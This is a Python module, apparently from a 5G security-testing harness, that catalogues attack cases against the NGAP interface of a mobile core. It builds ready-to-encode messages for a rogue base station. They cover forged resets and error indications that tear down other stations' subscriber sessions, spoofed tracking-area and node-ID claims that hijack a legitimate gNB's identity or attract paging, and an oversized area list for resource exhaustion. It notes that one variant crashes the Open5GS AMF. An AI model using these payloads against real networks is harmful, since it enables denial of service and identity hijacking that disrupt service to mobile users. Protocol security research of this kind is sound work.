"""Attack-case catalogue for g01-g04 (NGReset, RANConfigurationUpdate, NGSetup,
ErrorIndication).

Each CASE realizes one row of the "Candidate Attack Table" in the corresponding
`ngap_scaffold/output/batch11_secondpriority/g0X_*_response.txt` analysis, as a
distinct NGAP-IE-value combination. Every `build` returns an NGAP PDU value ready
for `ngap.encode`.

Builders in `builders.py` are reused unchanged. Where a case needs an IE the
existing builder cannot set, a small wrapper is defined HERE (never in
builders.py):
  * `ng_reset_full`               - NGReset, ResetType = whole NG interface
  * `ran_config_update_with_gnbid`- RANConfigurationUpdate carrying GlobalRANNodeID
  * `ng_setup_with_retention`     - NGSetupRequest carrying UERetentionInformation
  * `ng_setup_large_talist`       - NGSetupRequest with an inflated SupportedTAList
"""
from __future__ import annotations

from . import builders as B, ngap

CFG = {"mcc": "001", "mnc": "01", "tac": 1, "sst": 1, "sd": "010203",
       "gnb_id": 4660, "gnb_id_len": 32, "nci": 17}

# Victim / foreign values the attacker asserts (distinct from CFG's own identity).
VICTIM_TAC = 7            # a TAC this rogue gNB does not physically serve
VICTIM_GNB_ID = 0x00A1B2  # Global RAN Node ID of a legitimate gNB (collision)
TARGET_GNB_ID = 0x00C3D4  # a legitimate handover-target gNB to spoof
FOREIGN_MCC = "460"       # a PLMN this gNB is not authorized for
FOREIGN_MNC = "00"
VICTIM_SST = 2            # an S-NSSAI slice the rogue gNB is not provisioned for
VICTIM_SD = "0a0b0c"
VICTIM_AMF_UE_ID = 12345  # AMF-UE-NGAP-ID of a UE served by another gNB
VICTIM_RAN_UE_ID = 6789


def _cfg(base: dict, **over) -> dict:
    """Shallow copy of a cfg with overrides (to assert foreign PLMN/TAC/slice)."""
    c = dict(base)
    c.update(over)
    return c


# ---------------------------------------------------------------- new wrappers
def ng_reset_full(cause=("misc", "om-intervention")):
    """NG RESET with ResetType = whole NG Interface (ResetAll = reset-all).

    builders.ng_reset_partial only emits partOfNG-Interface; this covers the
    'full reset escapes association scope' row (g01-d)."""
    ies = [
        {"id": 15, "criticality": "ignore", "value": ("Cause", cause)},
        {"id": 88, "criticality": "reject",
         "value": ("ResetType", ("nG-Interface", "reset-all"))},
    ]
    return ("initiatingMessage", {
        "procedureCode": 20, "criticality": "reject",
        "value": ("NGReset", {"protocolIEs": ies}),
    })


def ran_config_update_with_gnbid(cfg: dict, *, gnb_id: int, tac=None,
                                 ran_node_name: str = "ngap-tester"):
    """RAN CONFIGURATION UPDATE that also carries a (spoofed) Global RAN Node ID.

    The stock builder omits IE 27; a colliding GlobalRANNodeID here lets the update
    re-bind the AMF's RAN-node table entry of a legitimate gNB (g02-d)."""
    ies = [
        {"id": 27, "criticality": "ignore",
         "value": ("GlobalRANNodeID",
                   B._global_gnb_id(cfg, gnb_id, int(cfg.get("gnb_id_len", 32))))},
        {"id": 82, "criticality": "ignore", "value": ("RANNodeName", ran_node_name)},
        {"id": 102, "criticality": "reject",
         "value": ("SupportedTAList", B._supported_ta_list(cfg, tac))},
        {"id": 21, "criticality": "ignore",
         "value": ("PagingDRX", cfg.get("paging_drx", "v128"))},
    ]
    return ("initiatingMessage", {
        "procedureCode": 35, "criticality": "reject",
        "value": ("RANConfigurationUpdate", {"protocolIEs": ies}),
    })


def ng_setup_with_retention(cfg: dict):
    """NG SETUP REQUEST carrying UERetentionInformation = ues-retained (IE 147).

    Combined with a spoofed Global RAN Node ID this drives the 'restart/retention
    desynchronization' row (g03-f)."""
    val = B.ng_setup_request(cfg)
    ies = val[1]["value"][1]["protocolIEs"]
    ies.append({"id": 147, "criticality": "ignore",
                "value": ("UERetentionInformation", "ues-retained")})
    return val


def ng_setup_large_talist(cfg: dict, n: int = 16):
    """NG SETUP REQUEST with an inflated SupportedTAList (n TACs).

    Distinguishing IE value for the fake-RAN / served-area resource-exhaustion
    row (g03-g)."""
    val = B.ng_setup_request(cfg)
    ies = val[1]["value"][1]["protocolIEs"]
    for ie in ies:
        if ie["id"] == 102:  # SupportedTAList
            ie["value"] = ("SupportedTAList",
                           sum((B._supported_ta_list(cfg, tac=t) for t in range(1, n + 1)), []))
    return val


# ---------------------------------------------------------------- case catalogue
CASES = [
    # ---- g01  NG RESET ---------------------------------------------------
    {"id": "g01-a", "msg": "NGReset",
     "desc": "cross-gNB partial reset: victim (AMF-UE,RAN-UE) pair tears down a UE on another gNB",
     "build": lambda cfg: B.ng_reset_partial([(VICTIM_AMF_UE_ID, VICTIM_RAN_UE_ID)])},
    {"id": "g01-b", "msg": "NGReset",
     "desc": "AMF-UE-ID-only path (RAN-UE-NGAP-ID omitted) -> unbound global lookup; "
             "this variant triggers the Open5GS AMF SIGABRT crash",
     "build": lambda cfg: B.ng_reset_partial([(VICTIM_AMF_UE_ID, None)])},
    {"id": "g01-d", "msg": "NGReset",
     "desc": "whole NG-Interface reset (ResetAll) - full-reset scope",
     "build": lambda cfg: ng_reset_full()},

    # ---- g02 / g03  false-TAI + gNB-ID collision (topology-trust surface) --
    {"id": "g02-a", "msg": "RANConfigurationUpdate",
     "desc": "claim a victim TAC via runtime update -> paging attraction for that TA",
     "build": lambda cfg: B.ran_configuration_update(cfg, tac=VICTIM_TAC)},
    {"id": "g03-a", "msg": "NGSetupRequest",
     "desc": "claim a victim TAC at NG Setup -> paging attraction for that TA",
     "build": lambda cfg: B.ng_setup_request(_cfg(cfg, tac=VICTIM_TAC))},
    {"id": "g03-b", "msg": "NGSetupRequest",
     "desc": "Global RAN Node ID collision: assert a legitimate gNB's gNB-ID (identity hijack)",
     "build": lambda cfg: B.ng_setup_request(_cfg(cfg, gnb_id=VICTIM_GNB_ID))},

    # ---- g04  ERROR INDICATION ------------------------------------------
    {"id": "g04-a", "msg": "ErrorIndication",
     "desc": "forged UE-associated error (victim AMF-UE-NGAP-ID) -> remote UE context release",
     "build": lambda cfg: B.error_indication(VICTIM_AMF_UE_ID, VICTIM_RAN_UE_ID)},
]
